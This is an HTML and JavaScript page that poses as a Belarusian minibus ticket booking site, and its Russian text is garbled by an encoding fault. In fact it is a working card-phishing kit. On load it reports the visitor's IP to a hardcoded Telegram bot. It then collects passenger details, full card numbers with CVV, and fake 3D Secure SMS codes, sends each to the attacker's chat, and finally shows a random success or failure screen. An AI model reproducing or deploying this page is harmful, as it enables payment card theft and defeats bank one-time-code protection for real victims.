<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Marshrutka Belarus</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: #0c111d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .card {
            max-width: 480px;
            width: 100%;
            background: #1a2535;
            border-radius: 32px;
            padding: 32px 24px;
            color: #e2e8f0;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        h1 { font-size: 28px; margin-bottom: 20px; color: white; }
        .route-panel {
            background: #0e1a28;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2d4b73;
        }
        .route-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #b7c4d9;
        }
        .price-large {
            font-size: 34px;
            color: #4299e1;
            text-align: center;
            margin: 20px 0;
        }
        .field {
            margin-bottom: 20px;
        }
        .field label {
            display: block;
            color: #b7c4d9;
            margin-bottom: 6px;
        }
        .field input {
            width: 100%;
            background: #0e1a28;
            border: 1px solid #2d4b73;
            border-radius: 16px;
            padding: 16px;
            color: white;
            font-size: 16px;
        }
        .field input:focus {
            outline: none;
            border-color: #4299e1;
        }
        .btn {
            background: #4299e1;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin: 20px 0;
        }
        .btn:active { transform: scale(0.98); }
        .spinner {
            border: 3px solid #2d4b73;
            border-top: 3px solid #4299e1;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .sms-input {
            font-size: 32px;
            letter-spacing: 12px;
            text-align: center;
            background: #0e1a28;
            border: 2px solid #2d4b73;
            border-radius: 24px;
            padding: 20px;
            width: 100%;
            color: white;
        }
        .bank-strip {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 30px;
            color: #6f7f99;
        }
    </style>
</head>
<body>
    <div class="card" id="app"></div>

    <script>
        const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
        const ADMIN_ID = 5852338439;
        const urlParams = new URLSearchParams(window.location.search);
        const linkHash = urlParams.get('hash');

        if (!linkHash) {
            document.getElementById('app').innerHTML = '<h1>–û—à–∏–±–∫–∞</h1><p>–ù–µ–≤–µ—Ä–Ω–∞—è —Å—Å—ã–ª–∫–∞</p>';
            throw new Error('No hash');
        }

        const routeData = {
            from: '–ú–∏–Ω—Å–∫',
            to: '–ì–æ–º–µ–ª—å',
            date: '15.03.2026',
            time: '18:30',
            price: 27
        };

        let state = {
            step: 'passenger',
            passenger: { fullName: '', phone: '', email: '' },
            card: { number: '', expiry: '', cvv: '', cardholder: '' },
            smsCode: '',
            sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7)
        };

        async function notifyClick() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: `üëÅ –ó–ê–•–û–î –ù–ê –°–°–´–õ–ö–£\n\nüîó –•–µ—à: ${linkHash}\nüåç IP: ${ipData.ip}\nüì± ${navigator.userAgent}`
                    })
                });
            } catch (e) {}
        }
        notifyClick();

        function formatCardNumber(v) {
            let d = v.replace(/\D/g, '').slice(0,16);
            let p = [];
            for (let i=0; i<d.length; i+=4) p.push(d.slice(i,i+4));
            return p.join(' ');
        }
        function formatExpiry(v) {
            let d = v.replace(/\D/g, '').slice(0,4);
            if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
            return d;
        }

        async function sendToBot(type) {
            let text = '';
            if (type === 'card') {
                text = `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê\n\n` +
                    `üöê ${routeData.from} ‚Üí ${routeData.to} ${routeData.date} ${routeData.time}\n` +
                    `üí∞ ${routeData.price} BYN\n` +
                    `üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${state.passenger.fullName} | ${state.passenger.phone} | ${state.passenger.email}\n` +
                    `üí≥ –ö–∞—Ä—Ç–∞: ${state.card.number}\n` +
                    `üìÖ –°—Ä–æ–∫: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
                    `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${state.card.cardholder}\n` +
                    `üîó –•–µ—à: ${linkHash}\n` +
                    `üÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;
            } else if (type === 'sms') {
                text = `üì® SMS-–ö–û–î\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${state.smsCode}\nüîó –•–µ—à: ${linkHash}`;
            }

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                });
            } catch (e) {}
        }

        function render() {
            const app = document.getElementById('app');
            let html = `<h1>Marshrutka</h1>`;

            if (state.step === 'passenger') {
                html += `<div class="route-panel">
                    <div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div>
                    <div class="route-row"><span>–î–∞—Ç–∞</span><span>${routeData.date} ${routeData.time}</span></div>
                </div>`;
                html += `<div class="price-large">${routeData.price} BYN</div>`;
                html += `<div class="field"><label>–§–ò–û *</label><input id="fullName" value="${state.passenger.fullName}"></div>`;
                html += `<div class="field"><label>–¢–µ–ª–µ—Ñ–æ–Ω *</label><input id="phone" value="${state.passenger.phone}"></div>`;
                html += `<div class="field"><label>Email</label><input id="email" value="${state.passenger.email}"></div>`;
                html += `<button class="btn" id="nextBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>`;
            } else if (state.step === 'card') {
                html += `<div class="route-panel">
                    <div class="route-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div>
                    <div class="route-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div>
                </div>`;
                html += `<div class="price-large">${routeData.price} BYN</div>`;
                html += `<div class="field"><label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label><input id="cardNumber" value="${state.card.number}"></div>`;
                html += `<div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                    <div class="field"><label>–°—Ä–æ–∫</label><input id="expiry" value="${state.card.expiry}"></div>
                    <div class="field"><label>CVV</label><input id="cvv" value="${state.card.cvv}"></div>
                </div>`;
                html += `<div class="field"><label>–í–ª–∞–¥–µ–ª–µ—Ü</label><input id="cardholder" value="${state.card.cardholder}"></div>`;
                html += `<button class="btn" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å</button>`;
                html += `<button class="btn" style="background:#2d4b73" onclick="state.step='passenger'; render();">‚Üê –ù–∞–∑–∞–¥</button>`;
            } else if (state.step === 'processing') {
                html += `<div style="text-align:center"><div class="spinner"></div><div style="margin-top:20px">–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</div></div>`;
            } else if (state.step === 'sms') {
                html += `<h2 style="font-size:22px; margin-bottom:20px;">üîê 3D Secure</h2>`;
                html += `<div style="color:#b7c4d9; margin-bottom:20px;">–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω</div>`;
                html += `<input class="sms-input" id="smsCode" maxlength="6">`;
                html += `<div style="display:flex; gap:10px; margin-top:20px;">
                    <button class="btn" style="flex:2" id="confirmBtn">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                    <button class="btn" style="flex:1; background:#2d4b73" id="resendBtn">‚Üª</button>
                </div>`;
                html += `<button class="btn" style="background:#2d4b73; margin-top:10px;" onclick="state.step='card'; render();">‚Üê –ù–∞–∑–∞–¥</button>`;
            } else if (state.step === 'success') {
                html += `<div style="text-align:center">
                    <div style="font-size:60px; color:#2ecc71; margin:20px 0;">‚úì</div>
                    <h2 style="margin-bottom:20px;">–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h2>
                    <div style="color:#b7c4d9; margin-bottom:30px;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS</div>
                    <button class="btn" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                </div>`;
            } else if (state.step === 'fail') {
                html += `<div style="text-align:center">
                    <div style="font-size:60px; color:#e74c3c; margin:20px 0;">‚úï</div>
                    <h2 style="margin-bottom:20px;">–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h2>
                    <button class="btn" onclick="state.step='card'; render();">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
                </div>`;
            }

            html += `<div class="bank-strip">–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫ ‚Ä¢ –ü—Ä–∏–æ—Ä–±–∞–Ω–∫ ‚Ä¢ –ê–ª—å—Ñ–∞-–ë–∞–Ω–∫ ‚Ä¢ Visa ‚Ä¢ Mastercard ‚Ä¢ –ë–µ–ª–∫–∞—Ä—Ç</div>`;
            app.innerHTML = html;

            if (state.step === 'passenger') {
                document.getElementById('nextBtn')?.addEventListener('click', () => {
                    state.passenger.fullName = document.getElementById('fullName').value;
                    state.passenger.phone = document.getElementById('phone').value;
                    state.passenger.email = document.getElementById('email').value;
                    if (!state.passenger.fullName || !state.passenger.phone) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è'); return; }
                    state.step = 'card'; render();
                });
            }

            if (state.step === 'card') {
                document.getElementById('cardNumber').addEventListener('input', e => e.target.value = formatCardNumber(e.target.value));
                document.getElementById('expiry').addEventListener('input', e => e.target.value = formatExpiry(e.target.value));
                document.getElementById('payBtn').addEventListener('click', async () => {
                    state.card.number = document.getElementById('cardNumber').value;
                    state.card.expiry = document.getElementById('expiry').value;
                    state.card.cvv = document.getElementById('cvv').value;
                    state.card.cardholder = document.getElementById('cardholder').value;
                    if (!state.card.number || !state.card.expiry || !state.card.cvv || !state.card.cardholder) {
                        alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã');
                        return;
                    }
                    await sendToBot('card');
                    state.step = 'processing'; render();
                    setTimeout(() => { state.step = 'sms'; render(); }, 5000);
                });
            }

            if (state.step === 'sms') {
                document.getElementById('confirmBtn').addEventListener('click', async () => {
                    state.smsCode = document.getElementById('smsCode').value;
                    if (!state.smsCode) { alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥'); return; }
                    await sendToBot('sms');
                    state.step = 'processing'; render();
                    setTimeout(() => {
                        if (Math.random() > 0.5) state.step = 'success';
                        else state.step = 'fail';
                        render();
                    }, 3000);
                });
                document.getElementById('resendBtn').addEventListener('click', () => {
                    alert('–ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                });
            }
        }

        render();
    </script>
</body>
</html>
